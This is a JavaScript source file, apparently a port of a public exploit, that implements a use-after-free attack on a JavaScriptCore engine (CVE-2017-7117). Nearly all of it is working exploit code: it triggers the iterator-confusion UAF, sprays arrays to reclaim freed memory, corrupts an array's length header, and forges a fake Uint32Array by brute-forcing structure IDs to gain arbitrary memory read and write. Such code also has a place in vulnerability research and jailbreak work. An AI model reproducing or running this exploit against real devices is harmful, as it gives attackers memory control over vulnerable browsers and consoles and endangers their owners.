//region VueAfterFree Entry Point (CVE-2017-7117)
// Port of Vuemony vue-after-free exploit
// https://github.com/Vuemony/vue-after-free
//
// Bootstrap strategy:
//   1. Trigger CVE-2017-7117 iterator confusion UAF via make_uaf(uaf_view)
//   2. The UAF frees uaf_view's backing buffer; spray JSArrays reclaim it
//   3. Scan uaf_view for marker pattern to find a spray array's butterfly
//   4. Corrupt the indexing header to change the array's length
//   5. Use structure ID spray to create a fake Uint32Array master
//   6. Set up arw.master, arw.victim, arw.leak_addr for full ARW

const VAF_SPRAY_SIZE = 0x100;

function vaf_make_uaf(arr) {
  const o = {};
  for (let i in { xx: "" }) {
    for (i of [arr]);
    o[i];
  }
}

async function init_vaf_rw() {
  arw.master = new Uint32Array(6);
  logger.info("Initiate VueAfterFree UAF...");

  const marker = new BInt(0xFFFF0000, 0x13371337);
  const indexing_header = new BInt(VAF_SPRAY_SIZE, VAF_SPRAY_SIZE);

  // Phase 1: Create uaf_view and trigger UAF
  // uaf_view is a large DataView whose backing buffer will be freed by the UAF.
  // After the spray, the backing buffer overlaps with the spray arrays' memory.
  const uaf_view = new DataView(new ArrayBuffer(0x100000));
  uaf_view.setUint32(0x10, 0xB0, true);

  vaf_make_uaf(uaf_view);
  logger.info("Achieved UAF !!");

  // Phase 2: Spray JSArrays to reclaim the freed memory
  const spray = new Array(0x1000);
  for (let i = 0; i < spray.length; i++) {
    spray[i] = new Array(VAF_SPRAY_SIZE).fill(0x13371337);
  }

  // Phase 3: Find corrupted array by scanning uaf_view for the marker
  // The spray arrays' butterflies overlap with uaf_view's backing buffer.
  // We look for the indexing_header + marker pattern in the butterfly.
  let marked_arr_offset = -1;
  let corrupted_arr_idx = -1;

  for (let i = 8; i < uaf_view.byteLength; i += 16) {
    if (uaf_view.getBInt(i - 8, true).eq(indexing_header) &&
      uaf_view.getBInt(i, true).eq(marker)) {
      logger.debug(`Found marker at uaf_view[${i}] !!`);
      marked_arr_offset = i - 8;
      break;
    }
  }

  if (marked_arr_offset === -1) {
    throw new Error("Failed to find marked array !!");
  }

  logger.debug(`Marked indexing header ${uaf_view.getBInt(marked_arr_offset, true)}`);

  // Phase 4: Corrupt the indexing header to change the array's length
  const corrupted_indexing_header = new BInt(0x1337, 0x1337);
  uaf_view.setBInt(marked_arr_offset, corrupted_indexing_header, true);

  // Phase 5: Find the corrupted array by checking lengths
  for (let i = 0; i < spray.length; i++) {
    if (spray[i].length === 0x1337) {
      logger.debug(`Found corrupted array at spray[${i}] !!`);
      logger.debug(`Corrupted array length ${new BInt(spray[i].length)}`);
      corrupted_arr_idx = i;
      break;
    }
  }

  if (corrupted_arr_idx === -1) {
    throw new Error("Failed to find corrupted array !!");
  }

  // Phase 6: Set up ARW using structure ID spray
  //
  // The approach:
  // 1. Store a plain object (leak_obj) in the corrupted array
  // 2. Read its address from uaf_view (since the butterfly overlaps)
  // 3. Spray Uint32Array structures with different structure IDs
  // 4. Create a fake object whose JSCell has a matching structure ID
  // 5. Write the fake object's address to the butterfly via uaf_view
  // 6. Read back the array element - if JSCell matches, engine returns Uint32Array

  const marked_arr_obj_offset = marked_arr_offset + 0x10;

  // Set up slave (victim DataView)
  arw.victim.setUint32(0, 0x13371337, true);

  // Leak address of leak_obj
  const leak_obj = { obj: arw.victim };
  spray[corrupted_arr_idx][1] = leak_obj;
  const leak_obj_addr = uaf_view.getBInt(marked_arr_obj_offset, true);
  logger.debug(`leak_obj_addr: ${leak_obj_addr}`);

  // arw.leak_addr = address of leak_obj's "obj" inline property
  arw.leak_addr = leak_obj_addr.add(0x10);
  logger.debug(`arw.leak_addr: ${arw.leak_addr}`);

  // Spray Uint32Array structures to fill the structure ID table
  const u32_structs = new Array(0x100);
  for (let i = 0; i < u32_structs.length; i++) {
    u32_structs[i] = new Uint32Array(1);
    u32_structs[i][`spray_${i}`] = 0x1337;
  }

  // Create fake Uint32Array master by trying different structure IDs
  const length_and_flags = new BInt(1, 0x30);
  let master = undefined;
  let master_addr = new BInt(0);

  const rw_obj = {
    js_cell: new BInt(0, 0).d(),
    butterfly: null,
    vector: arw.victim,
    length_and_flags: length_and_flags.d(),
  };

  let structure_id = 0x80;
  while (!(master instanceof Uint32Array)) {
    const js_cell = new BInt(
      structure_id++,
      0x00 | (0x23 << 8) | (0xE0 << 16) | (0x01 << 24)
    );

    rw_obj.js_cell = js_cell.jsv();
    spray[corrupted_arr_idx][1] = rw_obj;

    const rw_obj_addr = uaf_view.getBInt(marked_arr_obj_offset, true);
    master_addr = rw_obj_addr.add(0x10);

    uaf_view.setBInt(marked_arr_obj_offset, master_addr, true);
    master = spray[corrupted_arr_idx][1];
  }

  logger.info(`Found matching structure_id: ${structure_id - 1}`);
  arw.master = master;

  // Phase 7: Fix up master and slave for proper ARW
  const slave_addr = arw.addrof(arw.victim);
  logger.debug(`slave_addr: ${slave_addr}`);

  // Fix master: set butterfly=0, set length_and_flags
  arw.view(master_addr).setBInt(8, 0, true);
  arw.view(master_addr).setBInt(0x18, length_and_flags, true);

  // Fix slave: set TypeInfo flags, length=max, flags=1
  arw.view(slave_addr).setUint8(6, 0xA0); // TypeInfo::OverridesGetOwnPropertySlot | StructureIsImmortal
  arw.view(slave_addr).setInt32(0x18, -1, true); // length = max
  arw.view(slave_addr).setInt32(0x1C, 1, true); // flags = 1

  // Fix ArrayBuffer backing store length
  const slave_buf_addr = arw.view(slave_addr).getBInt(0x20, true);
  arw.view(slave_buf_addr).setInt32(0x20, -1, true);

  logger.info("Achieved ARW !!");

  // Cleanup
  spray.length = 0;

  return undefined;
}
//#endregion
